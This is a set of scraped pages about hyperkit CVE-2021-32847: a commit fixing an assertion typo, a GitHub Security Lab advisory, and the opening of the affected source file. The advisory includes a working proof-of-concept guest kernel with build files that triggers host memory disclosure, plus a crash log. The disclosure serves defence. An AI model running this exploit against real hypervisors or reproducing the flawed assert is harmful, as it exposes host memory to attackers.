=== Content from github.com_42160853_20250114_193002.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmoby%2Fhyperkit%2Fcommit%2Fcf60095a4d8c3cb2e182a14415467afd356e982f)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmoby%2Fhyperkit%2Fcommit%2Fcf60095a4d8c3cb2e182a14415467afd356e982f)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=moby%2Fhyperkit)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[moby](/moby)
/
**[hyperkit](/moby/hyperkit)**
Public

* [Notifications](/login?return_to=%2Fmoby%2Fhyperkit) You must be signed in to change notification settings
* [Fork
  326](/login?return_to=%2Fmoby%2Fhyperkit)
* [Star
   3.6k](/login?return_to=%2Fmoby%2Fhyperkit)

* [Code](/moby/hyperkit)
* [Issues
  47](/moby/hyperkit/issues)
* [Pull requests
  5](/moby/hyperkit/pulls)
* [Actions](/moby/hyperkit/actions)
* [Projects
  0](/moby/hyperkit/projects)
* [Security](/moby/hyperkit/security)
* [Insights](/moby/hyperkit/pulse)

Additional navigation options

* [Code](/moby/hyperkit)
* [Issues](/moby/hyperkit/issues)
* [Pull requests](/moby/hyperkit/pulls)
* [Actions](/moby/hyperkit/actions)
* [Projects](/moby/hyperkit/projects)
* [Security](/moby/hyperkit/security)
* [Insights](/moby/hyperkit/pulse)

## Commit

[Permalink](/moby/hyperkit/commit/cf60095a4d8c3cb2e182a14415467afd356e982f)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fix assertion turned into assignment

[Browse files](/moby/hyperkit/tree/cf60095a4d8c3cb2e182a14415467afd356e982f)
Browse the repository at this point in the history

```
The qassertion is supposed to check the value but the typo makes it
an assignment. Hence it is always true,

Signed-off-by: Frederic Dalleau <frederic.dalleau@docker.com>
```

* Loading branch information

[![@fredericdalleau](https://avatars.githubusercontent.com/u/79831213?s=40&v=4)](/fredericdalleau)

[fredericdalleau](/moby/hyperkit/commits?author=fredericdalleau "View all commits by fredericdalleau")
committed
Sep 14, 2021

1 parent
[10d79f4](/moby/hyperkit/commit/10d79f4d571001c01711edafd2da957d3506c6f8)

commit cf60095

Showing
**1 changed file**
with
**1 addition**
and
**1 deletion**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

2 changes: 1 addition & 1 deletion

2
[src/lib/pci\_virtio\_block.c](#diff-7f30994ee0715682de87e133eb589e9fe081fed07195be21a5c833c11b4e006d "src/lib/pci_virtio_block.c")

Show comments

[View file](/moby/hyperkit/blob/cf60095a4d8c3cb2e182a14415467afd356e982f/src/lib/pci_virtio_block.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -316,7 +316,7 @@ pci\_vtblk\_proc(struct pci\_vtblk\_softc \*sc, struct vqueue\_info \*vq) |
|  |  | case VBH\_OP\_DISCARD: |
|  |  | /\* We currently limit the discard to one segment in the initial negotiation |
|  |  | so expect exactly one correctly-sized payload descriptor. \*/ |
|  |  | assert(iov[1].iov\_len = sizeof(struct virtio\_blk\_discard\_write\_zeroes)); |
|  |  | assert(iov[1].iov\_len == sizeof(struct virtio\_blk\_discard\_write\_zeroes)); |
|  |  | assert(n == 2); |
|  |  | vbdiscard = iov[1].iov\_base; |
|  |  | io->io\_req.br\_offset = (off\_t) vbdiscard->sector \* DEV\_BSIZE; |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `cf60095`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmoby%2Fhyperkit%2Fcommit%2Fcf60095a4d8c3cb2e182a14415467afd356e982f) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from securitylab.github.com_e875821a_20250114_193004.html ===

[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

October 5, 2021
# GHSL-2021-058: Disclosure of the host memory into the virtualized guest in hyperkit - CVE-2021-32847

[![Author avatar](https://avatars.githubusercontent.com/u/102623)
Agustin Gianni](https://github.com/agustingianni)

## Coordinated Disclosure Timeline

* 2021-04-26: Maintainers contacted
* 2021-04-26: Maintainers acknowledged the receipt of the report
* 2021-09-14: Maintainers fixed the issues

## Summary

A malicious guest can trigger a vulnerability in the host by abusing the disk driver that may lead to the disclosure of the host memory into the virtualized guest.

## Product

hyperkit

## Tested Version

v0.20210107

## Details

### Issue 1: VBH\_OP\_DISCARD assertion turned into assignment (GHSL-2021-058)

The function `pci_vtblk_proc` handles the arrival of `virtio` descriptors sent by the guest. These descriptors contain disk `I/O` operations to be performed by the host on the disk image that contains the operating system. The operation `VBH_OP_DISCARD` contains a vulnerability that allows an attacker to read memory outside of the guest address space.

On [pci\_virtio\_block.c#L316](https://github.com/moby/hyperkit/blob/2f061e447e1435cdf1b9eda364cea6414f2c606b/src/lib/pci_virtio_block.c#L316) it can be seen how an assertion is used to verify the size of the incoming `iov` data structure. Unfortunately, a typo turns the equality operator into an assignment. In C, assignments return the value assigned so the assert will always be satisfied by any value of `iov_len`.

*Vulnerable call:*

```
	case VBH_OP_DISCARD:
		/* We currently limit the discard to one segment in the initial negotiation
		   so expect exactly one correctly-sized payload descriptor. */
		assert(iov[1].iov_len = sizeof(struct virtio_blk_discard_write_zeroes));
		assert(n == 2);
		vbdiscard = iov[1].iov_base;
		io->io_req.br_offset = (off_t) vbdiscard->sector * DEV_BSIZE;
		io->io_req.br_resid = vbdiscard->num_sectors * DEV_BSIZE;
		err = blockif_delete(sc->bc, &io->io_req);
		break;

```

By compiling `hyperkit` with `AddressSanitizer` the out of bounds access can be seen clearly on the following crash log.

*Host crashing:*

```
(lldb) r -s 0:0,hostbridge -s 1,uart -s 4,virtio-blk,disk.img -f multiboot,poc
Process 6867 launched: '/Users/goose/workspace/hyperkit/build/hyperkit.sym' (x86_64)
vmx_set_ctlreg: cap_field: 4 bit: 12 unspecified don't care: bit is 0
vmx_set_ctlreg: cap_field: 4 bit: 20 unspecified don't care: bit is 0
vmx_set_ctlreg: cap_field: 3 bit: 13 unspecified don't care: bit is 0
virtio-block: DISCARD op, 0x00000000 bytes, 1 segs
=================================================================
==6867==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x000114482000 at pc 0x0001000dba06 bp 0x70000d5eb3f0 sp 0x70000d5eb3e8
READ of size 4 at 0x000114482000 thread T3
    #0 0x1000dba05 in pci_vtblk_proc pci_virtio_block.c:322
    #1 0x1000da432 in pci_vtblk_notify pci_virtio_block.c:352
    #2 0x100134191 in vi_pci_write virtio.c:741
    #3 0x1000c6228 in pci_emul_io_handler pci_emul.c:364
    #4 0x100085cf5 in emulate_inout inout.c:243
    #5 0x100149b6a in vmexit_inout hyperkit.c:353
    #6 0x1001495ef in vcpu_loop hyperkit.c:631
    #7 0x1001443f2 in vcpu_thread hyperkit.c:278
    #8 0x7fff2046994f in _pthread_start+0xdf (libsystem_pthread.dylib:x86_64+0x694f)
    #9 0x7fff2046547a in thread_start+0xe (libsystem_pthread.dylib:x86_64+0x247a)

0x000114482000 is located 0 bytes to the right of 268435456-byte region [0x000104482000,0x000114482000)
allocated by thread T0 here:
    #0 0x1005d281f in wrap_valloc+0xaf (libclang_rt.asan_osx_dynamic.dylib:x86_64+0x4681f)
    #1 0x10006d8c6 in vmm_mem_alloc vmm_mem.c:49
    #2 0x1000417df in vm_malloc vmm.c:549
    #3 0x10004c645 in setup_memory_segment vmm_api.c:160
    #4 0x10004c3a9 in xh_vm_setup_memory vmm_api.c:192
    #5 0x100147372 in main hyperkit.c:1442
    #6 0x7fff20484620 in start+0x0 (libdyld.dylib:x86_64+0x15620)

Thread T3 created by T0 here:
    #0 0x1005cc4ba in wrap_pthread_create+0x5a (libclang_rt.asan_osx_dynamic.dylib:x86_64+0x404ba)
    #1 0x100143d4e in vcpu_add hyperkit.c:307
    #2 0x100147a14 in main hyperkit.c:1522
    #3 0x7fff20484620 in start+0x0 (libdyld.dylib:x86_64+0x15620)

SUMMARY: AddressSanitizer: heap-buffer-overflow pci_virtio_block.c:322 in pci_vtblk_proc
Shadow bytes around the buggy address:
  0x1000228903b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x1000228903c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x1000228903d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x1000228903e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x1000228903f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x100022890400:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x100022890410: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x100022890420: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x100022890430: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x100022890440: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x100022890450: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa

```
#### Impact

This issue leads to a guest reading memory outside its address space. In order to do so, a malicious guest can use this issue as an oracle, by putting the disk image into a known state and then proceeding to trigger the vulnerability. The `VBH_OP_DISCARD` operation will use an invalid `iov[1].iov_base` pointer to fill the `virtio_blk_discard_write_zeroes` structure with memory beyond the guest’s address space. A carefully crafted `iov_base` can be made such as the leaked data fills the field `num_sectors` therefore controlling the amount of sectors to be zeroed out by the discard operation. Now the attacker can read the amount of overwritten bytes the `VBH_OP_DISCARD` operation wrote.

To make this attack practical (writing an unknown 32 bit number of sectors to the disk can take some time) an attacker can carefully prepare the `virtio_blk_discard_write_zeroes` structure (by changing the offset of the original `iov` structure) to be filled with to be leaked data in smaller increments.

The impact of this vulnerability is exacerbated by the fact that in our tests, the guest memory is initialized on a `MALLOC_LARGE` zone that is located right before, and is contiguous with, a `MALLOC_TINY` which is prone to heap manipulation from the guest.

In the following snippet, it can be seen that the `iov_base` pointer falls into the zone `109000000-111000000` and

*Address of the pointer on lldb:*

```
p iov[1].iov_base
(void *) $0 = 0x0000000110fffff8

```

Virtual memory map of the exploited process:\_

```
$ vmmap hyperkit
...
MALLOC_LARGE                109000000-111000000    [128.0M     4K     4K     0K] rw-/rwx SM=ALI          DefaultMallocZone_0x1003d3000
MALLOC_TINY                 111000000-111100000    [ 1024K    12K    12K     0K] rw-/rwx SM=PRV          DefaultMallocZone_0x1003d3000
VM_ALLOCATE                 111100000-111280000    [ 1536K  1176K  1176K     0K] rw-/rwx SM=PRV
MALLOC_SMALL                111800000-112000000    [ 8192K    28K    28K     0K] rw-/rwx SM=PRV          DefaultMallocZone_0x1003d3000
MALLOC_SMALL                112000000-112800000    [ 8192K    20K    20K     0K] rw-/rwx SM=PRV          DefaultMallocZone_0x1003d3000
MALLOC_LARGE                112800000-11a800000    [128.0M  4204K  4204K     0K] rw-/rwx SM=PRV          DefaultMallocZone_0x1003d3000
MALLOC_LARGE                11a800000-11a83a000    [  232K    12K    12K     0K] rw-/rwx SM=PRV          DefaultMallocZone_0x1003d3000
...

```
#### Proof of Concept

The following `PoC` is a simple multiboot kernel that simulates a compromised guest. The guest must be booted with the device `virtio-blk` enabled by passing `hyperkit` the command line flags `-s 4,virtio-blk,disk.img` for example.

Make sure you compile `hyperkit` with `AddressSanitizer` in order to catch the invalid read access.

In order to compile it follow the instructions in the `resources` section.

```
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <string.h>

static void
outw(uint16_t port, uint16_t value)
{
    __asm__ __volatile__("outw %w0,%w1"
                         :
                         : "a"(value), "Nd"(port));
}

static void
outl(uint16_t port, uint32_t value)
{
    __asm__ __volatile__("outl %0,%w1"
                         :
                         : "a"(value), "Nd"(port));
}

struct __attribute__((packed)) vring_avail
{
    uint16_t va_flags;  /* VRING_AVAIL_F_* */
    uint16_t va_idx;    /* counts to 65535, then cycles */
    uint16_t va_ring[]; /* size N, reported in QNUM value */
};

struct __attribute__((packed)) virtio_desc
{                      /* AKA vring_desc */
    uint64_t vd_addr;  /* guest physical address */
    uint32_t vd_len;   /* length of scatter/gather seg */
    uint16_t vd_flags; /* VRING_F_DESC_* */
    uint16_t vd_next;  /* next desc if F_NEXT */
};

#define VRING_DESC_F_NEXT (1 << 0)
#define VRING_DESC_F_WRITE (1 << 1)
#define VRING_DESC_F_INDIRECT (1 << 2)

#define VRING_AVAIL_F_NO_INTERRUPT 1

struct __attribute__((packed)) virtio_blk_hdr
{
#define VBH_OP_READ 0
#define VBH_OP_WRITE 1
#define VBH_OP_FLUSH 4
#define VBH_OP_FLUSH_OUT 5
#define VBH_OP_IDENT 8
#define VBH_OP_DISCARD 11
#define VBH_OP_WRITE_ZEROES 13
#define VBH_FLAG_BARRIER 0x80000000 /* OR'ed into vbh_type */
    uint32_t vbh_type;
    uint32_t vbh_ioprio;
    uint64_t vbh_sector;
};

void poc()
{
    // 0. Choose an address that is mapped but unused.
    uintptr_t pfn = (uintptr_t)0x1000000;

    // Descriptors.
    struct virtio_desc *desc = (struct virtio_desc *)(pfn);

    // First descriptor.
    struct virtio_blk_hdr *vbh = (struct virtio_blk_hdr *)0x20000;
    vbh->vbh_type = VBH_OP_DISCARD;
    vbh->vbh_ioprio = 0;
    vbh->vbh_sector = 0;

    desc[0].vd_addr = vbh;
    desc[0].vd_len = sizeof(struct virtio_blk_hdr);
    desc[0].vd_next = 1;
    desc[0].vd_flags |= VRING_DESC_F_NEXT;

    // The first 8 bytes correspond to virtio_blk_discard_write_zeroes::sector
    // virtio_blk_discard_write_zeroes::num_sectors will be leaked memory
    uintptr_t addr = 0x10000000 - 8;

    // Second descriptor
    desc[1].vd_addr = addr;
    desc[1].vd_len = 0;
    desc[1].vd_next = 2;
    desc[1].vd_flags |= VRING_DESC_F_NEXT;

    // Third descriptor
    desc[2].vd_addr = 0x4000;
    desc[2].vd_len = 0x1;
    desc[2].vd_flags &= ~VRING_DESC_F_NEXT;
    desc[2].vd_flags |= VRING_DESC_F_WRITE;

    // Available descriptors.
    struct vring_avail *avail = (struct vring_avail *)(pfn + 0x800);

    avail->va_idx = 1;
    avail->va_flags |= VRING_AVAIL_F_NO_INTERRUPT;
    avail->va_ring[0] = 0;

    // 1. Select a queue.
    // VTCFG_R_QSEL = 0x0e
    outw(0x208e, 0);

    // 2. Initialize the queue to our address.
    // VTCFG_R_PFN = 0x08
    outl(0x2088, pfn / 4096);

    // 3. VTCFG_R_QNOTIFY
    outw(0x2080 | 0x10, 0);
}

int kernel_main(void)
{
    poc();
    return 0;
}

```
### Resources

In order to compile each proof of concept code, place the code into a C file in a directory along with the provided files `linker.ld` and `start.s`. You will also need to install `nasm` and `i686-elf-gcc`:

*Compilation:*

```
# Install compilation dependencies.
brew install nasm i686-elf-gcc

# Compile the kernel into a file named `poc`.
nasm -felf32 -w+all -o start.o start.s
i686-elf-gcc -std=c17 -Wall -ffreestanding -O0 -nostdlib -Wno-unused-function -c poc.c -o poc.o
i686-elf-gcc -std=c17 -Wall -ffreestanding -O0 -nostdlib -Wno-unused-function -T linker.ld start.o poc.o -o poc -lgcc

```

*linker.ld*

```
ENTRY(start)

SECTIONS
{
    . = 1M;

    .multiboot BLOCK(4K) : ALIGN(4K)
    {
        *(.multiboot)
    }

    .text BLOCK(4K) : ALIGN(4K)
    {
        *(.text)
    }

    .data BLOCK(4K) : ALIGN(4K)
    {
        *(.data)
    }

    .rodata BLOCK(4K) : ALIGN(4K)
    {
        *(.rodata)
    }

    .bss BLOCK(4K) : ALIGN(4K)
    {
        *(.common)
        *(.bss)
    }
}

```

*start.s*

```
KERNEL_STACK_SIZE equ 0x4000

[section .multiboot]
    MB_MODULEALIGN  equ  1 << 0
    MB_MEMINFO      equ  1 << 1
    MB_FLAGS        equ  MB_MODULEALIGN | MB_MEMINFO
    MB_MAGIC        equ  0x1BADB002
    MB_CHECKSUM     equ -(MB_MAGIC + MB_FLAGS)

    multiboot_header:
        dd MB_MAGIC
        dd MB_FLAGS
        dd MB_CHECKSUM

[section .text]
    start:
        global start
        lgdt [gdt_temp_r]
        mov eax, 0x10
        mov ds, ax
        mov es, ax
        mov ss, ax
        jmp 0x08:kernel_entry

    kernel_entry:
        mov esp, kernel_stack + KERNEL_STACK_SIZE
        mov ebp, esp
        extern kernel_main
        call kernel_main
        jmp $

[section .data]
    gdt_temp:
        dq 0x0000000000000000
        dq 0x00cf9a000000ffff
        dq 0x00cf92000000ffff

    gdt_temp_end:
    gdt_temp_r:
        dw gdt_temp_end - gdt_temp - 1
        dd gdt_temp

[section .bss]
    align 32
    kernel_stack:
          resb KERNEL_STACK_SIZE

```
## CVE

* CVE-2021-32847

## Credit

This issue was discovered and reported by GHSL team member [@agustingianni (Agustin Gianni)](https://github.com/agustingianni).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2021-58` in any communication regarding this issue.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information



=== Content from github.com_28df3791_20250114_193001.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmoby%2Fhyperkit%2Fblob%2F2f061e447e1435cdf1b9eda364cea6414f2c606b%2Fsrc%2Flib%2Fpci_virtio_block.c)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmoby%2Fhyperkit%2Fblob%2F2f061e447e1435cdf1b9eda364cea6414f2c606b%2Fsrc%2Flib%2Fpci_virtio_block.c)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=moby%2Fhyperkit)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[moby](/moby)
/
**[hyperkit](/moby/hyperkit)**
Public

* [Notifications](/login?return_to=%2Fmoby%2Fhyperkit) You must be signed in to change notification settings
* [Fork
  326](/login?return_to=%2Fmoby%2Fhyperkit)
* [Star
   3.6k](/login?return_to=%2Fmoby%2Fhyperkit)

* [Code](/moby/hyperkit)
* [Issues
  47](/moby/hyperkit/issues)
* [Pull requests
  5](/moby/hyperkit/pulls)
* [Actions](/moby/hyperkit/actions)
* [Projects
  0](/moby/hyperkit/projects)
* [Security](/moby/hyperkit/security)
* [Insights](/moby/hyperkit/pulse)

Additional navigation options

* [Code](/moby/hyperkit)
* [Issues](/moby/hyperkit/issues)
* [Pull requests](/moby/hyperkit/pulls)
* [Actions](/moby/hyperkit/actions)
* [Projects](/moby/hyperkit/projects)
* [Security](/moby/hyperkit/security)
* [Insights](/moby/hyperkit/pulse)

## Files

 2f061e4
## Breadcrumbs

1. [hyperkit](/moby/hyperkit/tree/2f061e447e1435cdf1b9eda364cea6414f2c606b)
2. /[src](/moby/hyperkit/tree/2f061e447e1435cdf1b9eda364cea6414f2c606b/src)
3. /[lib](/moby/hyperkit/tree/2f061e447e1435cdf1b9eda364cea6414f2c606b/src/lib)
/
# pci\_virtio\_block.c

Copy path Blame  Blame
## Latest commit

## History

[History](/moby/hyperkit/commits/2f061e447e1435cdf1b9eda364cea6414f2c606b/src/lib/pci_virtio_block.c)494 lines (446 loc) · 13.9 KB 2f061e4
## Breadcrumbs

1. [hyperkit](/moby/hyperkit/tree/2f061e447e1435cdf1b9eda364cea6414f2c606b)
2. /[src](/moby/hyperkit/tree/2f061e447e1435cdf1b9eda364cea6414f2c606b/src)
3. /[lib](/moby/hyperkit/tree/2f061e447e1435cdf1b9eda364cea6414f2c606b/src/lib)
/
# pci\_virtio\_block.c

Top
## File metadata and controls

* Code
* Blame

494 lines (446 loc) · 13.9 KB[Raw](https://github.com/moby/hyperkit/raw/2f061e447e1435cdf1b9eda364cea6414f2c606b/src/lib/pci_virtio_block.c)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494/\*- \* Copyright (c) 2011 NetApp, Inc. \* Copyright (c) 2015 xhyve developers \* All rights reserved. \* \* Redistribution and use in source and binary forms, with or without \* modification, are permitted provided that the following conditions \* are met: \* 1. Redistributions of source code must retain the above copyright \* notice, this list of conditions and the following disclaimer. \* 2. Redistributions in binary form must reproduce the above copyright \* notice, this list of conditions and the following disclaimer in the \* documentation and/or other materials provided with the distribution. \* \* THIS SOFTWARE IS PROVIDED BY NETAPP, INC ``AS IS'' AND \* ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE \* IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE 